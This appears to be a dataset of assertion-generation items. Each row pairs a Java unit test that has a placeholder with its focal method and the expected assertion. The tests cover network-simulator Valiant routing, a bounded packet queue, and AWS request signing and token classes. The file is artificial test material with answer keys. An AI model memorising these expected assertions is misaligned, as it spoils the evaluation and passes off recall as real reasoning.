"testValiantPassSyn() {  // Packet destined for node 3 when(packet.getSourceId()).thenReturn(4); when(packet.getDestinationId()).thenReturn(3); when(packet.isSYN()).thenReturn(true);  // Node 4 should receive it, and forward directly, as it is an ACK device4identity.receiveFromIntermediary(packet); ArgumentCaptor<ValiantEncapsulation> captor = ArgumentCaptor.forClass(ValiantEncapsulation.class); verify(topology.getPort(4, 2), times(0)).enqueue(captor.capture()); verify(topology.getPort(4, 3), times(1)).enqueue(captor.capture()); ""<AssertPlaceHolder>""; // Direct forward verify(layer4, times(0)).receive(packet);  }
receiveFromIntermediary(Packet genericPacket) { TcpPacket packet = (TcpPacket) genericPacket; assert(this.identifier == packet.getSourceId());  // Determine source and destination ToR int sourceToR; int destinationToR; if (isWithinExtendedTopology) { sourceToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getSourceId()); destinationToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getDestinationId()); } else { sourceToR =  packet.getSourceId(); destinationToR = packet.getDestinationId(); }  // Choose a valiant node (tries again if it finds one that is not allowed) int chosen; int i = 0; do { chosen = lowBoundValiantRangeIncl + packet.getHash(this.identifier, i) % valiantRangeSize;  i++; if (i > 10000) { throw new RuntimeException( ""Chose a wrong random number more than a 10000 times. This is extremely unlikely to happen; "" + ""presumably there is an extremely poor hashing function at work."" ); } } while (chosen == sourceToR || chosen == destinationToR);  // Log for statistic of valiant balancing if (!flowSeen.contains(packet.getFlowId())) { SimulationLogger.increaseStatisticCounter(""VAL_NODE_"" + chosen); flowSeen.add(packet.getFlowId()); }  // Create encapsulation ValiantEncapsulation encapsulation = new ValiantEncapsulation( packet, chosen );  // If it is a data acknowledgment, we always go shortest path // This excludes the third part of the three-way handshake, which is supposed to precede the initial data window if (packet.isSYN() || (packet.isACK() && packet.getAcknowledgementNumber() != 1)) { encapsulation.markPassedValiant(); }  // Propagate through the network receiveEncapsulationPassOn(encapsulation);  }"	assertTrue(captor.getValue().passedValiant())
"testValiantPassAckThirdOfHandshake() {  // Packet destined for node 3 when(packet.getSourceId()).thenReturn(4); when(packet.getDestinationId()).thenReturn(3); when(packet.isACK()).thenReturn(true); when(packet.getAcknowledgementNumber()).thenReturn(1L);  // Node 4 should receive it, and forward it valiantly, as it is the third ACK of the handshake and it should preceed the initial window device4identity.receiveFromIntermediary(packet); ArgumentCaptor<ValiantEncapsulation> captor = ArgumentCaptor.forClass(ValiantEncapsulation.class); verify(topology.getPort(4, 2), atMost(1)).enqueue(captor.capture()); verify(topology.getPort(4, 3), atMost(1)).enqueue(captor.capture()); ""<AssertPlaceHolder>""; // Via valiant verify(layer4, times(0)).receive(packet);  }
receiveFromIntermediary(Packet genericPacket) { TcpPacket packet = (TcpPacket) genericPacket; assert(this.identifier == packet.getSourceId());  // Determine source and destination ToR int sourceToR; int destinationToR; if (isWithinExtendedTopology) { sourceToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getSourceId()); destinationToR = Simulator.getConfiguration().getGraphDetails().getTorIdOfServer(packet.getDestinationId()); } else { sourceToR =  packet.getSourceId(); destinationToR = packet.getDestinationId(); }  // Choose a valiant node (tries again if it finds one that is not allowed) int chosen; int i = 0; do { chosen = lowBoundValiantRangeIncl + packet.getHash(this.identifier, i) % valiantRangeSize;  i++; if (i > 10000) { throw new RuntimeException( ""Chose a wrong random number more than a 10000 times. This is extremely unlikely to happen; "" + ""presumably there is an extremely poor hashing function at work."" ); } } while (chosen == sourceToR || chosen == destinationToR);  // Log for statistic of valiant balancing if (!flowSeen.contains(packet.getFlowId())) { SimulationLogger.increaseStatisticCounter(""VAL_NODE_"" + chosen); flowSeen.add(packet.getFlowId()); }  // Create encapsulation ValiantEncapsulation encapsulation = new ValiantEncapsulation( packet, chosen );  // If it is a data acknowledgment, we always go shortest path // This excludes the third part of the three-way handshake, which is supposed to precede the initial data window if (packet.isSYN() || (packet.isACK() && packet.getAcknowledgementNumber() != 1)) { encapsulation.markPassedValiant(); }  // Propagate through the network receiveEncapsulationPassOn(encapsulation);  }"	assertFalse(captor.getValue().passedValiant())
"testFields() { // TCP header 480bit // Ip header 480bit // Packet size = 64bit // Buffer size for 30 packets = (480+480+64)*30 = 30720 long maxNumberOfBits = 30720; long packetSizeByte = 8; BoundedPriorityOutputPort port = new BoundedPriorityOutputPort( sourceNetworkDevice, targetNetworkDevice, link, maxNumberOfBits );  Random r = new Random(); for(int i = 0; i < 60; i++){ FullExtTcpPacket p = new FullExtTcpPacket( 0L,packetSizeByte,0,0,1,0,0,0L,0L,false, false,false,false,false,false,false, false,false,0,r.nextInt(100) ); port.enqueue(p); } ""<AssertPlaceHolder>""; }
enqueue(Packet packet) { guaranteedEnqueue(packet); while (getBufferOccupiedBits() > maxQueueSizeInBits){ decreaseBufferOccupiedBits(priorityQueue.pollLast().getSizeBit()); }  }"	assertEquals(port.getQueueSize(), 30)
"returnSignedRequest() { ArgumentCaptor<SignableRequest> signableRequestArgumentCaptor = ArgumentCaptor.forClass(SignableRequest.class); underTest.setAws4Signer(mockAWS4Signer);  Request actualSignedRequest = underTest.sign(new Request.Builder() .url(""http://api.amazon.com"") .build());  verify(mockAWS4Signer) .sign(signableRequestArgumentCaptor.capture(), any(AWSCredentials.class));  SignableRequest actualSignableRequest = signableRequestArgumentCaptor.getValue();  ""<AssertPlaceHolder>""; }
sign(Request originalRequest) { SignableRequest<Request> signableRequest = new SignableRequestImpl(originalRequest); if (awsCredentialsProvider != null) { aws4Signer.sign(signableRequest, awsCredentialsProvider.getCredentials()); } else { aws4Signer.sign(signableRequest, awsCredentials); } return (Request) signableRequest.getOriginalRequestObject(); }"	assertEquals(((Request)actualSignableRequest.getOriginalRequestObject()).url(), actualSignedRequest.url())
"returnSignedRequestWithCredentialProvider() { ArgumentCaptor<SignableRequest> signableRequestArgumentCaptor = ArgumentCaptor.forClass(SignableRequest.class);  Mockito.when(mockAWSCredentialsProvider.getCredentials()).thenReturn(mockAWSCredentials);  underTestCredentialsProvider = new AWSSigV4Signer(AWSAuthenticationCredentials.builder() .accessKeyId(TEST_ACCESS_KEY_ID) .secretKey(TEST_SECRET_KEY) .region(TEST_REGION) .build(), AWSAuthenticationCredentialsProvider.builder() .roleArn(TEST_ROLE_ARN) .roleSessionName(TEST_ROLESESSION_NAME) .build() ); underTestCredentialsProvider.setAws4Signer(mockAWS4Signer); underTestCredentialsProvider.setAwsCredentialsProvider(mockAWSCredentialsProvider);  Request actualSignedRequest = underTestCredentialsProvider.sign(new Request.Builder() .url(""http://api.amazon.com"") .build());  verify(mockAWS4Signer) .sign(signableRequestArgumentCaptor.capture(), any(AWSCredentials.class));  SignableRequest actualSignableRequest = signableRequestArgumentCaptor.getValue();  ""<AssertPlaceHolder>""; }
sign(Request originalRequest) { SignableRequest<Request> signableRequest = new SignableRequestImpl(originalRequest); if (awsCredentialsProvider != null) { aws4Signer.sign(signableRequest, awsCredentialsProvider.getCredentials()); } else { aws4Signer.sign(signableRequest, awsCredentials); } return (Request) signableRequest.getOriginalRequestObject(); }"	assertEquals(((Request)actualSignableRequest.getOriginalRequestObject()).url(), actualSignedRequest.url())
"IOException { LWAClient testLWAClient = new LWAClient(TEST_ENDPOINT); testLWAClient.setOkHttpClient(mockOkHttpClient);  when(mockOkHttpClient.newCall(any(Request.class))) .thenReturn(mockCall); when(mockCall.execute()) .thenReturn(buildResponse(200, ""Azta|foo"", ""120"")) .thenReturn(buildResponse(200, ""Azta|foo1"", ""1""));  LWAAccessTokenCache testLWACache = new LWAAccessTokenCacheImpl(); LWAAuthorizationSigner testlwaSigner = new LWAAuthorizationSigner(LWAAuthorizationCredentials.builder() .clientId(TEST_CLIENT_ID) .clientSecret(TEST_CLIENT_SECRET) .refreshToken(TEST_REFRESH_TOKEN) .endpoint(TEST_ENDPOINT) .build() , testLWACache );  testlwaSigner.setLwaClient(testLWAClient); testLWAClient.setLWAAccessTokenCache(testLWACache); Request actualSignedRequest = testlwaSigner.sign(request); Request actualSignedSecondRequest = testlwaSigner.sign(request);  ""<AssertPlaceHolder>""; }
sign(Request originalRequest) { String accessToken = lwaClient.getAccessToken(lwaAccessTokenRequestMeta);  return originalRequest.newBuilder() .addHeader(SIGNED_ACCESS_TOKEN_HEADER_NAME, accessToken) .build(); }"	"assertEquals(""Azta|foo"", actualSignedSecondRequest.header(""x-amz-access-token""))"
"getReadLimitInfo() { ""<AssertPlaceHolder>""; }
getReadLimitInfo() { return null; }"	assertNull(underTest.getReadLimitInfo())
"getResourcePath() { ""<AssertPlaceHolder>""; }
getResourcePath() { return originalRequest.url() .getPath(); }"	"assertEquals(""/request/library"", underTest.getResourcePath())"
"noTimeOffset() { ""<AssertPlaceHolder>""; }
getTimeOffset() { return 0; }"	assertEquals(0, underTest.getTimeOffset())
"getEndpoint() { ""<AssertPlaceHolder>""; }
getEndpoint() { URI uri = null; try { uri = originalRequest.url().toURI(); } catch (URISyntaxException e) { throw new RuntimeException(e); }  return URI.create(String.format(""%s://%s"", uri.getScheme(), uri.getHost())); }"	"assertEquals(URI.create(""http://www.amazon.com""), underTest.getEndpoint())"
"getParameters() { Map<String, List<String>> expectedParamters = new HashMap<>(); expectedParamters.put(""test"", Collections.singletonList(""true"")); expectedParamters.put(""sky"", Collections.singletonList(""blue"")); expectedParamters.put(""right"", Collections.singletonList(""右""));  ""<AssertPlaceHolder>""; }
getParameters() { Map<String, List<String>> parameters = new HashMap<>(); try { List<NameValuePair> nameValuePairs = URLEncodedUtils.parse(originalRequest.url().toURI(), StandardCharsets.UTF_8); nameValuePairs.forEach(nameValuePair -> parameters.put(nameValuePair.getName(), Collections.singletonList(nameValuePair.getValue()))); } catch (URISyntaxException e) { throw new RuntimeException(e); }  return parameters; }"	assertEquals(expectedParamters, underTest.getParameters())
"getContent() { String expectedContent = ""{""foo"":""bar""}""; StringBuilder actualContent = new StringBuilder();  underTest = new SignableRequestImpl(new Request.Builder() .url(""https://www.amazon.com"") .post(RequestBody.create(MediaType.parse(""application/json; charset=utf-8""), expectedContent)) .build());  try(Scanner scanner = new Scanner(underTest.getContent())){ while(scanner.hasNext()) { actualContent.append(scanner.next()); } }  ""<AssertPlaceHolder>""; }
getContent() { ByteArrayInputStream inputStream = null;  if (originalRequest.body() != null) { try { Buffer buffer = new Buffer(); originalRequest.body().writeTo(buffer); inputStream = new ByteArrayInputStream(buffer.readByteArray()); } catch (IOException e) { throw new RuntimeException(""Unable to buffer request body"", e); } }  return inputStream; }"	assertEquals(expectedContent, actualContent.toString())
"getUnwrappedContent() { String expectedContent = ""{""ban"":""bop""}""; StringBuilder actualContent = new StringBuilder();  underTest = new SignableRequestImpl(new Request.Builder() .url(""https://www.amazon.com"") .post(RequestBody.create(MediaType.parse(""application/json; charset=utf-8""), expectedContent)) .build());  try(Scanner scanner = new Scanner(underTest.getContentUnwrapped())){ while(scanner.hasNext()) { actualContent.append(scanner.next()); } }  ""<AssertPlaceHolder>""; }
getContentUnwrapped() { return getContent(); }"	assertEquals(expectedContent, actualContent.toString())
"gracefulBlankParametersParse() { testRequest = new Request.Builder() .url(""http://www.amazon.com/request/library?  "") .get() .build();  underTest = new SignableRequestImpl(testRequest);  ""<AssertPlaceHolder>""; }
getParameters() { Map<String, List<String>> parameters = new HashMap<>(); try { List<NameValuePair> nameValuePairs = URLEncodedUtils.parse(originalRequest.url().toURI(), StandardCharsets.UTF_8); nameValuePairs.forEach(nameValuePair -> parameters.put(nameValuePair.getName(), Collections.singletonList(nameValuePair.getValue()))); } catch (URISyntaxException e) { throw new RuntimeException(e); }  return parameters; }"	assertTrue(underTest.getParameters().isEmpty())
"gracefulIncompleteParameterPairsParse() { testRequest = new Request.Builder() .url(""http://www.amazon.com/request/library?isSigned& =false"") .get() .build();  Map<String, List<String>> expected = new HashMap<>(); expected.put(""isSigned"", Collections.singletonList(null)); expected.put("" "", Collections.singletonList(""false""));  underTest = new SignableRequestImpl(testRequest);  ""<AssertPlaceHolder>""; }
getParameters() { Map<String, List<String>> parameters = new HashMap<>(); try { List<NameValuePair> nameValuePairs = URLEncodedUtils.parse(originalRequest.url().toURI(), StandardCharsets.UTF_8); nameValuePairs.forEach(nameValuePair -> parameters.put(nameValuePair.getName(), Collections.singletonList(nameValuePair.getValue()))); } catch (URISyntaxException e) { throw new RuntimeException(e); }  return parameters; }"	assertEquals(expected, underTest.getParameters())
"getHeadersIncludesContentTypeFromRequestBody() { String expected = ""application/json; charset=utf-8""; RequestBody requestBody = RequestBody.create(MediaType.parse(expected), ""{""foo"":""bar""}"");  testRequest = new Request.Builder() .url(""http://www.amazon.com"") .post(requestBody) .header(""Content-Type"", ""THIS SHOULD BE OVERRIDDEN WITH REQUEST BODY CONTENT TYPE"") .build();  underTest = new SignableRequestImpl(testRequest);  ""<AssertPlaceHolder>""; }
getHeaders() { Map<String, String> headers = new HashMap<>();  Request requestSnapshot = signableRequestBuilder.build(); requestSnapshot.headers() .names() .forEach(headerName -> headers.put(headerName, requestSnapshot.header(headerName)));  if (requestSnapshot.body() != null) { MediaType contentType = requestSnapshot.body().contentType(); if (contentType != null) { headers.put(CONTENT_TYPE_HEADER_NAME, contentType.toString()); } }  return headers; }"	"assertEquals(expected, underTest.getHeaders().get(""Content-Type""))"
"missingRequestBodyDoesNotOverwriteExistingContentTypeHeader() { String expected = ""testContentType"";  testRequest = new Request.Builder() .url(""http://www.amazon.com"") .get() .header(""Content-Type"", expected) .build();  underTest = new SignableRequestImpl(testRequest);  ""<AssertPlaceHolder>""; }
getHeaders() { Map<String, String> headers = new HashMap<>();  Request requestSnapshot = signableRequestBuilder.build(); requestSnapshot.headers() .names() .forEach(headerName -> headers.put(headerName, requestSnapshot.header(headerName)));  if (requestSnapshot.body() != null) { MediaType contentType = requestSnapshot.body().contentType(); if (contentType != null) { headers.put(CONTENT_TYPE_HEADER_NAME, contentType.toString()); } }  return headers; }"	"assertEquals(expected, underTest.getHeaders().get(""Content-Type""))"
